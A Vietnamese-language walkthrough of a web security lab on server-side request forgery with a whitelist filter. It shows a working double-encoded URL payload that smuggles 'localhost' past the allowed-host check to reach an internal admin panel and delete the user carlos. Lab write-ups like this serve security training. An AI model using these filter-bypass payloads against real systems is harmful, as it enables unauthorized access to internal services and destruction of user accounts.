## SSRF with whitelist-based input filter

Mục đích của lab này chúng ta phải pass qua Whitelist

Bắt lại request checkStock và thay value của apiStock thành localhost sẽ bị ăn error như này. 

Có vẻ như web bắt buộc chúng ta phải bắt đầu bằng ***stock.weliketoshop.net***

![](/imgs/SSRF/13.png?raw=true)

Đổi lại như vậy thì lại ăn ngay lỗi mới

![](/imgs/SSRF/14.png?raw=true)

Cho đến khi test thử

```markdown
**stockApi=http://localhost%25%32%33@stock.weliketoshop.net/admin** (stockApi=http://localhost#@stock.weliketoshop.net/admin)
```

![](/imgs/SSRF/15.png?raw=true)

**Đây là cấu trúc một URL API mà dựa vào đó mà ta có thể khai thác cách phân tích URL của một máy chủ**
***scheme://user:pass@host:port/path?query=value#fragment***

**Thêm thông tin đăng nhập vào URL trước hostname / Sử dụng # để chỉ ra nội dung của mục con**

![](/imgs/SSRF/16.png?raw=true)

Tiến hành xóa user carlos bằng

```markdown
**stockApi=http://localhost%25%32%33@stock.weliketoshop.net/admin/delete?username=carlos**
```

![](/imgs/SSRF/17.png?raw=true)

### Tài liệu tham khảo
- [Public API:](https://yarl.readthedocs.io/en/latest/api.html) 